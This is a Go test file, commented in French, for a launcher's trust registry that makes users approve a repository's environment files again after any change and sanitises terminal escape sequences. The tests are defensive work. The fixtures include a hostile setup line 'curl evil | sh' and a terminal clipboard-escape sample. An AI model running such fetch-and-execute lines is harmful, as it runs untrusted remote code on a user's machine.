package core

// #215 (amendement audit) : registre d'approbation trust.json — compléments boîte noire à envtrust_test.go.
// Registre dans le CL_CONFIG_DIR du test (jamais le vrai), projets factices sous t.TempDir().

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
)

func proj215(t *testing.T, env, tpl string) string {
	t.Helper()
	d := t.TempDir()
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	if env != "" {
		_ = os.WriteFile(EnvPath(d), []byte(env), 0o644)
	}
	if tpl != "" {
		_ = os.WriteFile(envTemplatePath(d), []byte(tpl), 0o644)
	}
	return d
}

func cfg215(t *testing.T) string {
	t.Helper()
	d := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", d)
	_ = os.WriteFile(filepath.Join(d, "backends.yaml"), []byte("backends: {}\n"), 0o644) // moteurs du PATH écartés
	return d
}

const env215 = "image: debian:12\nsetup:\n  - touch /tmp/PREUVE\nmounts:\n  - path: /tmp\n"

func TestRegistreHorsProjetEtDroits215(t *testing.T) {
	cfg := cfg215(t)
	d := proj215(t, env215, "")
	if ok, err := MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	reg := filepath.Join(cfg, "trust.json")
	b, err := os.ReadFile(reg)
	if err != nil {
		t.Fatalf("registre absent du dossier de config : %v", err)
	}
	if runtime.GOOS != "windows" {
		if st, _ := os.Stat(reg); st.Mode().Perm() != 0o600 {
			t.Errorf("droits du registre %v, attendu 0600", st.Mode().Perm())
		}
	}
	var m map[string]TrustEntry
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatalf("registre illisible : %v", err)
	}
	e, ok := m[RemotePath(d)]
	if !ok || e.State != TrustPending || e.Source != "https://github.com/a/b.git" || e.Image != "ubuntu:24.04" || e.SHA == "" || e.At == "" {
		t.Errorf("entrée = %+v (clé %s) dans %s", e, RemotePath(d), b)
	}
	// rien n'est écrit dans le projet par l'approbation
	var inProject []string
	_ = filepath.Walk(d, func(p string, st os.FileInfo, _ error) error {
		if st != nil && st.Mode().IsRegular() && strings.Contains(strings.ToLower(filepath.Base(p)), "trust") {
			inProject = append(inProject, p)
		}
		return nil
	})
	if len(inProject) != 0 {
		t.Errorf("fichier d'approbation écrit dans le projet : %v", inProject)
	}
	if ents, _ := filepath.Glob(filepath.Join(cfg, ".trust.json.tmp-*")); len(ents) != 0 {
		t.Errorf("temporaires du registre laissés : %v", ents)
	}
}

func TestEnvFilesSHACouvreLesDeuxFichiers215(t *testing.T) {
	cfg215(t)
	d := proj215(t, env215, "")
	a := EnvFilesSHA(d)
	if a == "" || EnvFilesSHA(d) != a {
		t.Fatal("sha vide ou instable")
	}
	_ = os.WriteFile(envTemplatePath(d), []byte("packages: [jq]\n"), 0o644)
	b := EnvFilesSHA(d)
	if b == a {
		t.Error("ajout de env-template.yaml sans effet sur le sha")
	}
	_ = os.WriteFile(EnvPath(d), []byte(env215+"# x\n"), 0o644)
	if EnvFilesSHA(d) == b {
		t.Error("modification de env.yaml sans effet sur le sha")
	}
	// contenu déplacé d'un fichier à l'autre : sha différent (les deux fichiers ne se confondent pas)
	d1 := proj215(t, "image: a\n", "packages: [b]\n")
	d2 := proj215(t, "packages: [b]\n", "image: a\n")
	if EnvFilesSHA(d1) == EnvFilesSHA(d2) {
		t.Error("env.yaml et env-template.yaml confondus dans le sha")
	}
}

// Fichier d'environnement du seul template : la question se pose aussi (le dépôt le fournit).
func TestPendingPourEnvTemplateSeul215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "", "image: debian:12\nsetup: [x]\n")
	if ok, err := MarkEnvPending(d, "u", "debian:12"); !ok || err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("env-template.yaml seul : %v %v %s", ok, err, EnvTrust(d))
	}
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.Files["env-template.yaml"] == "" || info.Risk.Exec != 1 {
		t.Errorf("info = %+v %v", info, err)
	}
}

// Règle (décision utilisateur) : l'approbation N'EST PAS définitive — toute modification des fichiers par le dépôt
// (git pull, édition), après « accepter » comme après « ouvrir sans », remet la question. Retour sur l'état approuvé
// (même contenu) : l'approbation vaut de nouveau.
func TestPullApresAcceptationEtIgnoreRedemande215(t *testing.T) {
	for _, choice := range []string{"accept", "ignore"} {
		t.Run(choice, func(t *testing.T) {
			cfg215(t)
			d := proj215(t, env215, "image: debian:12\n")
			_, _ = MarkEnvPending(d, "u", "ubuntu:24.04")
			info, _ := EnvTrustInfoFor(d)
			if _, err := AnswerEnvTrust(d, choice, info.SHA); err != nil {
				t.Fatal(err)
			}
			want := map[string]TrustState{"accept": TrustAccepted, "ignore": TrustIgnored}[choice]
			if EnvTrust(d) != want || EnvTrustChanged(d) {
				t.Fatalf("avant pull : état %s changed=%v", EnvTrust(d), EnvTrustChanged(d))
			}
			// « git pull » : trois modifications de natures différentes ; chacune remet la question
			for i, c := range []struct{ env, tpl string }{
				{"image: debian:12\nsetup:\n  - curl evil | sh\n", "image: debian:12\n"}, // env.yaml seul
				{env215, "image: debian:12\npackages: [nmap]\n"},                         // env-template.yaml seul
				{"", ""}, // fichiers supprimés
			} {
				_ = os.Remove(EnvPath(d))
				_ = os.Remove(envTemplatePath(d))
				if c.env != "" {
					_ = os.WriteFile(EnvPath(d), []byte(c.env), 0o644)
				}
				if c.tpl != "" {
					_ = os.WriteFile(envTemplatePath(d), []byte(c.tpl), 0o644)
				}
				if got := EnvTrust(d); got != TrustPending || !EnvTrustChanged(d) {
					t.Fatalf("pull n°%d : état %s changed=%v, attendu pending + changed", i+1, got, EnvTrustChanged(d))
				}
				if _, err := LoadEnv(d); !errors.Is(err, ErrEnvChanged) || !errors.Is(err, ErrEnvNotApproved) {
					t.Errorf("pull n°%d : LoadEnv = %v, attendu ErrEnvChanged (⊂ ErrEnvNotApproved)", i+1, err)
				}
			}
			// la question porte l'indication « changé » ; la réponse (nouveau sha) rétablit l'approbation
			_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup:\n  - nouveau\n"), 0o644)
			info2, err := EnvTrustInfoFor(d)
			if err != nil || !info2.Changed || info2.State != TrustPending {
				t.Fatalf("info après pull = %+v %v", info2, err)
			}
			if _, err := AnswerEnvTrust(d, "accept", info2.SHA); err != nil || EnvTrust(d) != TrustAccepted || EnvTrustChanged(d) {
				t.Errorf("seconde acceptation : %v état=%s changed=%v", err, EnvTrust(d), EnvTrustChanged(d))
			}
			if e, err := LoadEnv(d); err != nil || len(e.Setup) != 1 || e.Setup[0] != "nouveau" {
				t.Errorf("LoadEnv après nouvelle acceptation = %+v %v", e, err)
			}
			// « Revoir » → pending (sans changement de fichiers)
			if err := ReviewEnvTrust(d); err != nil || EnvTrust(d) != TrustPending || EnvTrustChanged(d) {
				t.Errorf("Revoir : %v %s changed=%v", err, EnvTrust(d), EnvTrustChanged(d))
			}
		})
	}
}

// Modification faite par le LAUNCHER lui-même (F2, réglages du projet) : l'empreinte suit, pas de re-demande — mais
// jamais si le dépôt avait déjà changé les fichiers avant.
func TestEcritureDuLauncherNeRedemandePas215(t *testing.T) {
	cfg215(t)
	_ = os.WriteFile(filepath.Join(cfg215Dir(t), "backends.yaml"), []byte("backends:\n  pod: {type: podman}\n"), 0o644)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil {
		t.Fatal(err)
	}
	shaAvant := EnvFilesSHA(d)
	// écriture par le launcher : changer le socle (comme F2 / réglages)
	if err := ApplyExec(d, "docker.io/library/alpine:3.20", "pod"); err != nil {
		t.Fatal(err)
	}
	if EnvFilesSHA(d) == shaAvant {
		t.Fatal("ApplyExec n'a pas modifié env.yaml : le scénario ne teste rien")
	}
	if EnvTrust(d) != TrustAccepted || EnvTrustChanged(d) {
		t.Errorf("écriture du launcher : état %s changed=%v, attendu accepted sans re-demande", EnvTrust(d), EnvTrustChanged(d))
	}
	if e, err := LoadEnv(d); err != nil || e.Image != "docker.io/library/alpine:3.20" {
		t.Errorf("LoadEnv = %+v %v", e, err)
	}
	// le dépôt change ensuite : la question revient
	_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup: [evil]\n"), 0o644)
	if EnvTrust(d) != TrustPending {
		t.Fatal("changement du dépôt après une écriture du launcher non détecté")
	}
	// si le dépôt avait changé AVANT l'écriture du launcher : l'écriture ne vaut pas approbation du contenu du dépôt
	if err := ApplyExec(d, "docker.io/library/alpine:3.19", "pod"); err != nil {
		t.Fatal(err)
	}
	if EnvTrust(d) != TrustPending {
		t.Errorf("écriture du launcher sur un environnement déjà modifié par le dépôt : état %s, attendu pending", EnvTrust(d))
	}
}

func cfg215Dir(t *testing.T) string { t.Helper(); return Ng2ConfigDir() }

// Un clone sans fichier d'environnement est enregistré « none » ; un env.yaml qui apparaît ensuite (pull) → pending.
func TestCloneSansEnvEstNoneEtEnvApparuRedemande215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "", "")
	pending, err := MarkEnvPending(d, "https://github.com/a/b.git", "debian:12")
	if err != nil || pending {
		t.Fatalf("MarkEnvPending sans env = %v %v, attendu (false, nil)", pending, err)
	}
	e, ok := EnvTrustEntry(d)
	if !ok || e.State != TrustNone || e.Source != "https://github.com/a/b.git" || e.Image != "debian:12" {
		t.Fatalf("entrée = %+v (présente=%v), attendu none avec l'URL et le socle", e, ok)
	}
	if EnvTrust(d) != TrustNone || EnvTrustChanged(d) {
		t.Errorf("état %s changed=%v", EnvTrust(d), EnvTrustChanged(d))
	}
	// le dépôt reçoit un env.yaml par un pull
	_ = os.WriteFile(EnvPath(d), []byte(env215), 0o644)
	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
		t.Fatalf("env.yaml apparu : état %s changed=%v, attendu pending", EnvTrust(d), EnvTrustChanged(d))
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv = %v", err)
	}
	// avec env.yaml au clone : pending d'emblée
	d2 := proj215(t, env215, "")
	if pending, err := MarkEnvPending(d2, "u", "i"); !pending || err != nil || EnvTrust(d2) != TrustPending || EnvTrustChanged(d2) {
		t.Errorf("clone avec env.yaml : %v %v %s", pending, err, EnvTrust(d2))
	}
}

// Entrée posée AVANT le clonage : un clone interrompu ne devient jamais de confiance.
func TestRegisterCloneAvantLeClone215(t *testing.T) {
	cfg215(t)
	d := t.TempDir() // dossier encore vide : le clone n'a pas eu lieu
	if err := RegisterClone(d, "https://github.com/a/b.git", "debian:12"); err != nil {
		t.Fatal(err)
	}
	e, ok := EnvTrustEntry(d)
	if !ok || e.State != TrustPending || e.Source != "https://github.com/a/b.git" || e.Image != "debian:12" {
		t.Fatalf("entrée = %+v (présente=%v)", e, ok)
	}
	// le clone arrive (avec env.yaml) pendant que l'entrée est pending : la question se pose, rien n'est appliqué
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	_ = os.WriteFile(EnvPath(d), []byte(env215), 0o644)
	if EnvTrust(d) != TrustPending {
		t.Error("clone interrompu devenu de confiance")
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv = %v", err)
	}
	// l'undo d'une création échouée retire l'entrée
	d3 := t.TempDir()
	base := filepath.Dir(d3)
	dir, undo, err := CreateProjectDir([]string{base}, base, "", false, "clone-echoue")
	if err != nil {
		t.Fatal(err)
	}
	if err := RegisterClone(dir, "u", "i"); err != nil {
		t.Fatal(err)
	}
	if _, ok := EnvTrustEntry(dir); !ok {
		t.Fatal("entrée absente après RegisterClone")
	}
	undo()
	if e, ok := EnvTrustEntry(dir); ok {
		t.Errorf("entrée %+v restée après l'undo d'une création échouée", e)
	}
}

// trust.json illisible : échec fermé (tout projet portant un environnement est refusé), fichier JAMAIS réécrit.
func TestRegistreIllisibleEchecFerme215(t *testing.T) {
	for name, content := range map[string]string{"tronqué": `{"/x": {"state": "acc`, "vide": "", "pas du json": "pas du json", "tableau": "[]x"} {
		t.Run(name, func(t *testing.T) {
			cfg := cfg215(t)
			reg := filepath.Join(cfg, "trust.json")
			if err := os.WriteFile(reg, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
			d := proj215(t, env215, "")
			if EnvTrust(d) != TrustPending {
				t.Errorf("EnvTrust = %s, attendu pending (échec fermé)", EnvTrust(d))
			}
			if _, err := LoadEnv(d); !errors.Is(err, ErrTrustBroken) || !errors.Is(err, ErrEnvNotApproved) {
				t.Errorf("LoadEnv = %v, attendu ErrTrustBroken (⊂ ErrEnvNotApproved)", err)
			}
			// aucune écriture ne passe, aucune ne réécrit le fichier
			if _, err := MarkEnvPending(d, "u", "i"); !errors.Is(err, ErrTrustBroken) {
				t.Errorf("MarkEnvPending = %v", err)
			}
			if err := RegisterClone(d, "u", "i"); !errors.Is(err, ErrTrustBroken) {
				t.Errorf("RegisterClone = %v", err)
			}
			if err := ReviewEnvTrust(d); !errors.Is(err, ErrTrustBroken) {
				t.Errorf("ReviewEnvTrust = %v", err)
			}
			if _, err := AnswerEnvTrust(d, "accept", EnvFilesSHA(d)); !errors.Is(err, ErrTrustBroken) {
				t.Errorf("AnswerEnvTrust = %v", err)
			}
			if err := ApplyExec(d, "docker.io/library/alpine:3.20", "host"); err != nil {
				_ = err // l'écriture du launcher peut aboutir ; elle ne doit pas toucher au registre
			}
			if got, _ := os.ReadFile(reg); string(got) != content {
				t.Errorf("trust.json réécrit : %q, attendu %q", got, content)
			}
			// le registre réparé (supprimé) : le projet redevient de confiance faute d'entrée
			_ = os.Remove(reg)
			if EnvTrust(d) != TrustTrusted {
				t.Errorf("registre supprimé : %s", EnvTrust(d))
			}
		})
	}
}

// Copie trust.json.bak de la version précédente avant chaque écriture.
func TestRegistreCopieBakAvantEcriture215(t *testing.T) {
	cfg := cfg215(t)
	d1, d2 := proj215(t, env215, ""), proj215(t, env215, "")
	_, _ = MarkEnvPending(d1, "u1", "i")
	reg := filepath.Join(cfg, "trust.json")
	v1, _ := os.ReadFile(reg)
	_, _ = MarkEnvPending(d2, "u2", "i")
	if bak, err := os.ReadFile(reg + ".bak"); err != nil || string(bak) != string(v1) {
		t.Errorf("trust.json.bak = %q, %v ; attendu la version précédente %q", bak, err, v1)
	}
	if runtime.GOOS != "windows" {
		if st, _ := os.Stat(reg + ".bak"); st.Mode().Perm() != 0o600 {
			t.Errorf("droits du .bak %v, attendu 0600", st.Mode().Perm())
		}
	}
}

func TestRisqueDetaille215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "image: debian:12\npackages: [jq, git]\npackages_by_manager:\n  apt: [curl]\n  dnf: [wget, nmap]\nsetup: [a, b]\non_start: [c]\nwatch: [package.json]\nlocal: [node_modules, .cache]\nmounts:\n  - path: /tmp\n", "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, err := EnvTrustInfoFor(d)
	if err != nil {
		t.Fatal(err)
	}
	r := info.Risk
	if r.Exec != 3 || r.HostMounts != 1 || r.Packages != 5 || r.Watch != 1 || r.Local != 2 {
		t.Errorf("risque = %+v, attendu exec 3, montages 1, paquets 5 (jq git curl wget nmap), watch 1, local 2", r)
	}
	if len(info.Spec.PackagesByManager["dnf"]) != 2 || len(info.Spec.Watch) != 1 || len(info.Spec.Local) != 2 {
		t.Errorf("spec = %+v", info.Spec)
	}
}

func TestIgnoredSansImageChoisieRefuse215(t *testing.T) {
	cfg215(t)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "") // aucun socle choisi
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil {
		t.Fatal(err)
	}
	if e, err := LoadEnv(d); err == nil || len(e.Setup) != 0 || len(e.Mounts) != 0 {
		t.Errorf("ignored sans socle : %+v %v, attendu une erreur sans AUCUN contenu du dépôt", e, err)
	}
}

func TestChoixInconnuEtCancelNEcrivantRien215(t *testing.T) {
	cfg := cfg215(t)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	before, _ := os.ReadFile(filepath.Join(cfg, "trust.json"))
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "oui", info.SHA); err == nil {
		t.Error("choix inconnu accepté")
	}
	if _, err := AnswerEnvTrust(d, "cancel", info.SHA); err != nil {
		t.Error(err)
	}
	if _, err := AnswerEnvTrust(d, "cancel", "perime"); err != nil { // cancel ne dépend pas du sha
		t.Errorf("cancel avec sha périmé : %v", err)
	}
	if after, _ := os.ReadFile(filepath.Join(cfg, "trust.json")); string(after) != string(before) {
		t.Error("registre modifié par un choix inconnu ou un cancel")
	}
}

func TestProjetHoteOuHorsConteneurPasDeQuestion215(t *testing.T) {
	cfg := cfg215(t)
	_ = os.WriteFile(filepath.Join(cfg, "backends.yaml"), []byte("backends:\n  pod: {type: podman}\n"), 0o644)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	if EnvContainerProject(d) {
		t.Error("projet non affecté : pas de conteneur, pas de question")
	}
	if err := WriteAssignment(d, "host"); err != nil {
		t.Fatal(err)
	}
	if EnvContainerProject(d) {
		t.Error("projet affecté à l'hôte : aucune question (env.yaml inutilisé)")
	}
	if err := WriteAssignment(d, "pod"); err != nil {
		t.Fatal(err)
	}
	if !EnvContainerProject(d) {
		t.Error("projet affecté à un backend conteneur : la question se pose")
	}
}

func TestMarkEnvPendingConcurrentSansPerte215(t *testing.T) {
	cfg215(t)
	const n = 10
	dirs := make([]string, n)
	for i := range dirs {
		dirs[i] = proj215(t, env215, "")
	}
	var wg sync.WaitGroup
	for _, d := range dirs {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			if ok, err := MarkEnvPending(d, "u", "debian:12"); !ok || err != nil {
				t.Error(ok, err)
			}
		}(d)
	}
	wg.Wait()
	for _, d := range dirs {
		if EnvTrust(d) != TrustPending {
			t.Errorf("entrée perdue pour %s (écritures concurrentes)", d)
		}
	}
}

func TestInfoTronqueLesGrosFichiers215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "image: x\n"+strings.Repeat("# bourrage\n", 20000), "")
	_, _ = MarkEnvPending(d, "u", "x")
	info, err := EnvTrustInfoFor(d)
	if err != nil {
		t.Fatal(err)
	}
	if f := info.Files["env.yaml"]; len(f) > 70*1024 || !strings.Contains(f, "tronqué") {
		t.Errorf("fichier brut de %d octets, attendu tronqué (≈ 64 Ko)", len(f))
	}
}

func TestSafeTerminalTextSequences215(t *testing.T) {
	for _, in := range []string{
		"\x1b[31mROUGE", "\x1b]0;titre\x07", "\x1b]52;c;ZXZpbA==\x07", "\u009b31m", "\u009d0;t\u009c", "a\x00b", "x\x08\x08y", "\x1bP$q\x1b\\", "\x1b[2J\x1b[H",
	} {
		got := SafeTerminalText(in)
		for _, r := range got {
			if r == 0x1b || r == 0x7f || (r < 0x20 && r != '\n' && r != '\t') || (r >= 0x80 && r <= 0x9f) {
				t.Errorf("SafeTerminalText(%q) = %q : caractère de contrôle %U conservé", in, got, r)
			}
		}
	}
	for _, in := range []string{"a\u202eb", "a\u200bb", "a\u2066b\u2069", "a\u061cb", "\ufeffa", "a\u200fb", "a\u202ab"} {
		if got := SafeTerminalText(in); strings.ContainsAny(got, "\u202e\u200b\u2066\u2069\u061c\ufeff\u200f\u202a") || !strings.Contains(got, "·") {
			t.Errorf("SafeTerminalText(%q) = %q : bidi ou invisible conservé", in, got)
		}
	}
	if got := SafeTerminalText("ligne1\r\nligne2\tcol <b>gras</b> é"); !strings.Contains(got, "\tcol <b>gras</b> é") || strings.Contains(got, "\r") {
		t.Errorf("texte normal altéré : %q", got)
	}
}
